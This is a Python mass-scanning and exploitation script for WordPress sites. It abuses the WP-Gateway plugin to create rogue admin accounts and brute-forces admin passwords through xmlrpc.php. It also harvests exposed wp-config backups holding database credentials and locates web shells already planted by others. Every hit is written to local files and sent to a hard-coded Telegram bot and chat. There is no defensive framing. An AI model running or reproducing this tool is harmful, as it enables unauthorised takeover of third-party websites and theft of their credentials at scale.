import requests,argparse,sys,re,os,json,io
from multiprocessing.dummy import Pool
requests.urllib3.disable_warnings()
os.system('clear')

data,loop = [],0
headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           'referer': 'www.google.com'}
hd = {'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'}
def logo():
    print("""
                        . .
 : .                  .   .
 .     .            .     .
  .       .       .      .
    .      .     .      .
       .     .  .     .
           .  . .   .
             ...   .
       .  ^         . #Xm4nXp1337 
    .                 .
  .    O               .
 .                     .
 .                    .
   .                 .
    ^^....           .
        .. ..  ... ...
    """)

def get_domain(url):
        if url.startswith("http://"):
            url = url.replace("http://", "")
        elif url.startswith("https://"):
            url = url.replace("https://", "")
        pattern = re.compile('(.*)/')
        while re.findall(pattern, url):
            matches = re.findall(pattern, url)
            url = matches[0]
        return url
class ExploitWP():
    def __init__(self):
        pass 
    def main(self):
        print('1.) Plugins WP-Gateway\n2.) WP REGISTER')
        cc = inputuser() 
        if cc == '1':
            man = Pool(args.thread);man.map(self.wpgatewey,data);man.close();man.join()
        elif cc == '2':
            man = Pool(args.thread);man.map(self.registerwp,data);man.close();man.join()
        elif cc == '3':
            man = Pool(args.thread);man.map(self.brutexml,data);man.close();man.join()
    def wpgatewey(self,url):
        try:
            dataz = {'admin_username': 'msetanbilyahh', 'admin_password': 'Ranzx383830', 'admin_email': 'msetanbilyahh33434343@gmail.com',
                    'admin_firstname': 'rang', 'admin_lastname': 'gex'}
            dataz = json.dumps(dataz)
            check_url = f"https://{url}/wp-content/plugins/wpgateway/wpgateway-webservice-new.php?wp_new_credentials=1"
            ree = requests.post(check_url,data=dataz, headers=hd, verify=False, timeout=20)
            if '"message":"User created Successfully"' in str(ree.content):
                print('[Register Success] : {}'.format(url))
                open('Panels.txt', 'a').write(url + '/wp-login.php#msetanbilyahh@Ranzx383830' + '\n')
            else:
                print('[Failed New-Admin] : {}'.format(url))
        except:pass
    def registerwp(self,url):
        path_ = ["/wp-login.php?action=register","/wp/wp-login.php?action=register","/wordpress/wp-login.php?action=register","/blog/wp-login.php?action=register","/register-2/","/wp/register-2/","/wordpress/register-2/","/blog/register-2/"]
        for path in path_:
            try:
                check_url = f"https://{url}"
                check = requests.post(check_url,data=dataz, headers=hd, verify=False, timeout=20)
                if '<form name="registerform"' in check.text:
                    print('[Register Success] : {}'.format(url))
                    open('Panels.txt', 'a').write(url + '/wp-login.php#msetanbilyahh@Ranzx383830' + '\n')
                else:
                    print('[Failed New-Admin] : {}'.format(url))
            except:pass
    def brutexml(self,url):
        global loop 
        path_ = ["pass","admin","admin123","password","pass123"]
        #sap = requests.Session()
      #  sys.stdout.write(f"\rloading brute {loop}%"),sys.stdout.flush()
        for path in path_:
            pau = f"""<?xml version="1.0" encoding="UTF-8"?><methodCall> <methodName>wp.getUsersBlogs</methodName> <params> <param><value>admin</value></param> <param><value>{path}</value></param> </params> </methodCall>"""
            try:
                check_url = f"https://{url}/xmlrpc.php"
                check = requests.post(check_url,data=pau, headers=hd, verify=False, timeout=15)
                if "blogName" in check.text:
             #   if 'Incorrect username or password.' in check.text or 'Неправильне ім’я користувача чи пароль.' in check.text or "File not found." in check.text:pass
              #  elif "You don't have permission to access this resource." in check.text:pass
             #   elif check.status_code == 403:pass
              #  else:
                    print(f"\nURL : {check_url}\nUSR : admin\nPWD : {path}")
                    open('wplogin.txt', 'a').write(url + f'/wp-login.php#aadmin@{path}' + '\n')
                    response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text={check_url}")
                    break
                else:print('[Failed New-Admin] : {}'.format(check_url))
            except:print('[Failed New-Admin] : {}'.format(check_url))

class ScannerWP():
    def __init__(self):
        self.s = requests.Session()
        self.s.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'})
    def main(self):
        print(f"Collection : {len(data)}\n")
        print('1.) Scanner RevSlider\n2.) Scanner Cloud P\n3.) WpConfig Backup')
        cc = inputuser() 
        if cc == '1':
            man = Pool(args.thread);man.map(ScannerWP().revslider,data);man.close();man.join()
        elif cc == '2':
            man = Pool(args.thread);man.map(ScannerWP().cloudshell,data);man.close();man.join()
        elif cc == '3':
      #      self.wpconfig(data)
            man = Pool(args.thread);man.map(ScannerWP().wpconfig,data);man.close();man.join()

    def wpconfig(self,web):
        path_ = ['/wp/wp-config.php.bak','/wordpress/wp-config.php.bk','/wordpress/wp-config.php.bak','/blog/wp-config.php.bk','/blog/wp-config.php.bak','/wp/wp-config.php','/wordpress/wp-config.php','/wp-config.php','/blog/wp-config.php','/wp-config.php.bk','/wp-config.php.bak','/wp/wp-config.php.bk']
        for path in path_:
            try:
                check_url = f"http://{web}{path}"
                response = self.s.get(check_url, headers=hd, verify=False, timeout=10)
                if 'DB_USER' in response.text and 'DB_PASSWORD' in response.text and 'DB_HOST' in response.text:
                    print(f"{web} --> [Success]")
                    with open("wpconfig.txt", "a") as output_file:
                        output_file.write(check_url + "\n")
                    response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text={check_url}")
                    break
                else:print(f"{web} --> [Fail]")
            except:pass
    def revslider(self,web):
        path_ = ['/wp-content/plugins/revslider/includes/external/page/index.php','/wp-config-sample.php','/wp-content/upgrade-functions.php','/wp-content/plugins/Cache/Cache.php','/wp-admin/css/colors/blue/']
        for path in path_:
            try:
                check_url = f"http://{web}{path}"
                response = self.s.get(check_url, headers=hd, verify=False, timeout=10)
                if "Shell Bypass 403 GE-C666C" in response.text:
                    print(f"{web} --> [Success]")
                    with open("shellfound.txt", "a") as output_file:
                        output_file.write(check_url + "\n")
                    response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text={check_url}")
              
                    break
                else:pass
            except:pass
    def cloudshell(self,web):
        path_ = ['/.well-known/pki-validation/cloud.php', '/.well-known/acme-challenge/cloud.php', '/wp-admin/network/cloud.php', '/cloud.php','/cgi-bin/cloud.php', '/css/cloud.php', '/wp-admin/user/cloud.php', '/img/cloud.php', '/wp-admin/css/colors/coffee/cloud.php','/wp-admin/images/cloud.php', '/images/cloud.php', '/wp-admin/js/widgets/cloud.php','/wp-admin/css/colors/cloud.php', '/wp-admin/includes/cloud.php', '/wp-admin/css/colors/blue/cloud.php', '/wp-admin/cloud.php']
        for path in path_:
            try:
                check_url = f"http://{web}{path}"
                response = self.s.get(check_url, headers=hd, verify=False, timeout=10)
                if "-rw-r--r--" in response.text:
                    print(f"{web} --> [Success]")
                    with open("shellfound.txt", "a") as output_file:
                        output_file.write(check_url + "\n")
                    response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text={check_url}")
              
                    break
                else:
                    print(f"{web} --> [Fail]")
            except:pass
class AllScanner():
    def __init__(self):
       self.s = requests.Session()
    def main(self):
        print(f"1.) Php Debugbar\n2.) Env Scanner\n")
        cc = inputuser() 
        if cc == '1':
            man = Pool(args.thread);man.map(AllScanner().phpdebug,data);man.close();man.join()
        elif cc == '2':
            man = Pool(args.thread);man.map(ScannerWP().cloudshell,data);man.close();man.join()
        elif cc == '3':
      #      self.wpconfig(data)
            man = Pool(args.thread);man.map(ScannerWP().wpconfig,data);man.close();man.join()
    def phpdebug(self,web):
        try:
            check_url = f"http://{web}"
            response = self.s.get(check_url, headers=hd, verify=False, timeout=10)
            if "PhpDebugBar.DebugBar" in response.text:
                print(f"{web} --> [Success]")
                with open("phpdebugbar.txt", "a") as output_file:
                    output_file.write(check_url + "\n")
                response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text=PhpDebugbar\n{check_url}")
              
            else:
                print(f"{web} --> [Fail]")
        except:pass

def generate_api():
    pass
def inputuser():
    xx = input("pilih : ")
    return xx
class Remote():
    def __init__(self):
        self.total = [] 
    # main utama 
    
    def main(self):
        global data
        logo()
        if args.method and args.cms and args.files:
            try:
                haha = io.open(args.files,'r',encoding='utf-8').read()
                if len(haha) < 1:
                    sys.exit()
                else:
                    for i in haha.splitlines():
                        data.append(get_domain(i))
            except FileNotFoundError:
                print('Fuck You Idiot')
                sys.exit()
            if args.cms == 'wp':self.wordpress()
            else:pass
            if args.cms == 'other':self.all()
            else:pass
        else:
            print(f'python3 {sys.argv[0]} -c [wp,prestashop] -m [scanner,exploit] -d files.txt -t [20-200]')

    def all(self):
        if args.method == "scanner":
            AllScanner().main()
        elif args.method == "exploit":
            ExploitWP().main()
    def wordpress(self):
        if args.method == "scanner":
            ScannerWP().main()
        elif args.method == "exploit":
            ExploitWP().main()
            




        

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute Force CVE Details")
    parser.add_argument("-t","--thread",default=20,type=int,help="Thread 1-300")
    parser.add_argument("-m","--method",help="scanner,exploit,webinformation")
    parser.add_argument("-c","--cms",help="wordpress,drupal,prestashop,other")
    parser.add_argument("-f","--info",help="info cve")
    parser.add_argument("-d","--files",help="<sites.txt>")
    args = parser.parse_args()
    thread = args.thread 
    method = args.method 
    detect = args.cms
    files = args.files
    Remote().main()
